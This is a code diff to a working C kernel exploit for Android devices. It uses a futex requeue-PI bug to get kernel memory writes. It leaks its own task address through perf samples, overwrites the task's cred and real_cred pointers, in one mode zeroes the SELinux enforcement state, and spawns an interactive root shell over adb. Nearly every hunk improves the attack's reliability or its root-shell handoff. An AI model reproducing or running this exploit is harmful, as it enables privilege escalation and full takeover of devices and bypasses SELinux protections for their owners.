@@ -99,6 +99,9 @@ static int select_offsets(void) {
       if (active_offsets->phys_offset || active_offsets->kernel_phys_load < 0x10000000) {
         p0_phys_offset = active_offsets->phys_offset;
       }
+      if (active_offsets->mm_struct_sz) {
+        g_mm_struct_sz = active_offsets->mm_struct_sz;
+      }
       pr_info("init_cred image=%016zx alias=%016zx\n",
               (size_t)g_init_cred_image, (size_t)data_addr(g_init_cred_image));
       return 0;
@@ -260,10 +263,12 @@ void *consumer_thread(void *arg __attribute__((unused))) {
         if (atomic_load(&punch_consume_stop) ||
             atomic_load(&punch_consume_go) != seq) break;
         atomic_fetch_add(&consumer_calls, 1);
-        /* Retarget walk 0 to consumer's real_cred if we have our task */
-        if (calls_this_seq == 0 && write_mode_is_cred(pselect_custom_write) &&
+        /* Retarget walk 0 to consumer's real_cred if we have our task.
+         * MODE 6 ONLY: in mode 7 walk 0 is the SELinux zero-write, and
+         * retargeting it would clobber that plan. */
+        if (calls_this_seq == 0 && pselect_custom_write == 6 &&
             g_consumer_task) {
-          uintptr_t cpc = (g_consumer_task + TASK15_REAL_CRED_OFF - 8) | 1;
+          uintptr_t cpc = (g_consumer_task + TASK_REAL_CRED_OFF - 8) | 1;
           for (int b2 = 0; ; b2++) {
             uint8_t *pg2 = uring_block(b2);
             if (!pg2) break;
@@ -271,7 +276,7 @@ void *consumer_thread(void *arg __attribute__((unused))) {
           }
           char m3[96];
           int n3 = snprintf(m3, sizeof(m3), "[RETARGET] walk 0 -> consumer real_cred %016lx\n",
-                            (unsigned long)(g_consumer_task + TASK15_REAL_CRED_OFF));
+                            (unsigned long)(g_consumer_task + TASK_REAL_CRED_OFF));
           write(1, m3, n3);
         }
         {
@@ -286,11 +291,17 @@ void *consumer_thread(void *arg __attribute__((unused))) {
          * be a real priority change, else __sched_setscheduler exits early
          * without walking (GATE A), and a decrease would be EPERM (GATE B)
          * and divert to the uncontrolled FUTEX_LOCK_PI fallback walk. */
-        int nice = g_consumer_nice + 7;
+        int nice_step =
+            (active_offsets && active_offsets->iov_covers_waiter) ? 1 : 7;
+        /* Ladder from the waiter's CURRENT nice (it may be -20 after the
+         * main thread's setpriority storm), never from an assumed 0, so the
+         * very first round is always a real priority change (GATE A). */
+        int pre_nice = getpriority(PRIO_PROCESS, tid);
+        int nice = pre_nice + nice_step;
         if (nice > 19) nice = 19;
+        if (nice <= pre_nice) nice = (pre_nice < 19) ? pre_nice + 1 : 19;
         g_consumer_nice = nice;
         {
-          int pre_nice = getpriority(PRIO_PROCESS, tid);
           char m[128];
           int n = snprintf(m, sizeof(m), "[NICE] walk %d: %d -> %d\n",
                            calls_this_seq, pre_nice, nice);
@@ -518,6 +529,26 @@ void reset_main_route_state(void) {
   cfi_last_step = 0; cfi_last_errno = 0;
 }
 
+/* Diagnostic: dump a blocked thread's kernel stack / wchan / syscall so we
+ * can pin the exact PI-wait call chain (and therefore which inlined frame
+ * holds the dangling rt_waiter) without needing dmesg. */
+static void dump_task_kernel_state(const char *tag, int tid) {
+  static const char *files[] = {"stack", "wchan", "syscall"};
+  prctl(PR_SET_DUMPABLE, 1, 0, 0, 0);
+  for (size_t i = 0; i < sizeof(files) / sizeof(files[0]); i++) {
+    char p[80];
+    snprintf(p, sizeof(p), "/proc/self/task/%d/%s", tid, files[i]);
+    int fd = open(p, O_RDONLY);
+    if (fd < 0) { pr_info("[%s] %s: errno=%d\n", tag, files[i], errno); continue; }
+    char b[2048];
+    ssize_t n = read(fd, b, sizeof(b) - 1);
+    close(fd);
+    if (n <= 0) { pr_info("[%s] %s: read errno=%d\n", tag, files[i], errno); continue; }
+    b[n] = 0;
+    pr_info("[%s] %s:\n%s", tag, files[i], b);
+  }
+}
+
 void run_main_route_threads(void) {
   reset_main_route_state();
   /* Install the in-handler overlay route (walk-before-cleanup): the
@@ -540,6 +571,8 @@ void run_main_route_threads(void) {
   while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started))
     usleep(1000);
   usleep(50000);
+  /* Waiter is (or should be) blocked in FUTEX_WAIT_REQUEUE_PI here. */
+  dump_task_kernel_state("pre-trigger", atomic_load(&waiter_tid));
   errno = 0;
   {
     long rr = futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
@@ -691,9 +724,9 @@ static int do_one_write(uintptr_t target, const char *desc, int mode) {
      * (commit_creds at exec BUG_ONs unless cred == real_cred, so both
      * pointer writes are required before any execve). Three erases fit
      * the three rungs of the nice ladder: 0->7, 7->14, 14->19. */
-    ghost_push_plan(g_leaked_task + TASK15_CRED_OFF,
+    ghost_push_plan(g_leaked_task + TASK_CRED_OFF,
                     page_base + FAKE_CRED_OFF);
-    ghost_push_plan(g_leaked_task + TASK15_REAL_CRED_OFF,
+    ghost_push_plan(g_leaked_task + TASK_REAL_CRED_OFF,
                     page_base + FAKE_CRED_OFF);
     pr_info("  walk0: selinux zero, walk1: cred, walk2: real_cred, "
             "fake_cred=%016zx plans=%d\n",
@@ -939,6 +972,10 @@ int g_selinux_off = 0;
 uintptr_t g_selinux_target = 0;
 uintptr_t g_init_user_ns_addr = 0;
 int g_hit_block = -1;
+/* Pid of the cloned interactive root shell, if one was spawned. The PARENT
+ * waits on it (instead of exiting immediately) so the adb shell stays
+ * blocked in waitpid and the root shell owns the pty. */
+long g_root_shell_pid = 0;
 uintptr_t g_ns_cands[16];
 int g_ns_cand_count = 0;
 
@@ -1067,6 +1104,14 @@ static uintptr_t perf_leak_own_task(void) {
   uint64_t pos = hdr->data_tail;
   uintptr_t cands[1024]; int nc = 0;
   uint64_t min_ip = (uint64_t)-1;
+  /* Kernel-image low bound. The modules/vmalloc region lives BELOW the image
+   * (MODULES_VADDR 0xffffffc000000000 .. KIMAGE_VADDR 0xffffffc008000000), and
+   * kernels with CONFIG_BPF_JIT_ALWAYS_ON run JITted seccomp filters from there
+   * on every getpid, so an unfiltered min_ip can land below _text and fail the
+   * 2MB-anchor sanity gate. Anchor on the running image instead. */
+  const uint64_t kimg_lo = (active_offsets && active_offsets->kimage_text_base)
+                               ? active_offsets->kimage_text_base
+                               : 0xffffffc008000000ULL;
   int total_samples = 0, my_samples = 0;
   while (pos < head && nc < 1024 * 32) {
     struct perf_event_header *ev = (void *)(base + (pos % dsz));
@@ -1077,7 +1122,7 @@ static uintptr_t perf_leak_own_task(void) {
       uint64_t ip; memcpy(&ip, p, 8); p += 8;
       uint32_t s_pid, s_tid;
       memcpy(&s_pid, p, 4); memcpy(&s_tid, p + 4, 4); p += 8;
-      if (ip >= 0xffffffc000000000ULL && ip < min_ip) min_ip = ip;
+      if (ip >= kimg_lo && ip < min_ip) min_ip = ip;
       total_samples++;
       if (s_tid == my_tid) {
         my_samples++;
@@ -2117,7 +2162,7 @@ static int run_cred_swap(void) {
     /* Mode 7 targets selinux_state first (the cred plans are pushed
      * inside do_one_write); mode 6 targets task->cred directly. */
     if (!do_one_write(selinux_mode ? g_selinux_target
-                                   : g_leaked_task + TASK15_CRED_OFF,
+                                   : g_leaked_task + TASK_CRED_OFF,
                       selinux_mode ? "selinux+cred swap" : "cred swap",
                       selinux_mode ? WRITE_MODE_CRED_SELINUX : 6)) continue;
     uint32_t uid_now = syscall(__NR_getuid);
@@ -2552,7 +2597,7 @@ static int run_cred_swap(void) {
             }
             RELAY_STR("root shell child pid="); RELAY_DEC(cpid);
             RELAY_STR(cpid > 0 ? "\n" : " (clone FAILED)\n");
-            if (cpid > 0) shell_spawned = 1;
+            if (cpid > 0) { shell_spawned = 1; g_root_shell_pid = cpid; }
           } else {
             RELAY_STR("root shell: skipped (GHOST_EXEC=0)\n");
           }
@@ -2878,6 +2923,7 @@ static int run_cred_swap(void) {
         } else {
           RAW_WRITE(1, "[+] root shell pid="); raw_wdec(1, cpid);
           RAW_WRITE(1, "\n");
+          g_root_shell_pid = cpid;
         }
       } else {
         RAW_WRITE(1, "[!] partial plan (hits=");
@@ -2895,6 +2941,14 @@ static int run_cred_swap(void) {
         }
       }
       syscall(__NR_fsync, 1);
+      /* Hand the controlling pty to the cloned root shell: wait here so the
+       * adb shell stays blocked in its own waitpid and the root shell is the
+       * only process reading the terminal. When the shell exits, we exit and
+       * the adb prompt returns. */
+      if (g_root_shell_pid > 0) {
+        int wst;
+        syscall(__NR_wait4, g_root_shell_pid, &wst, 0, 0);
+      }
       syscall(__NR_exit_group, 99);
       return 0;
     }
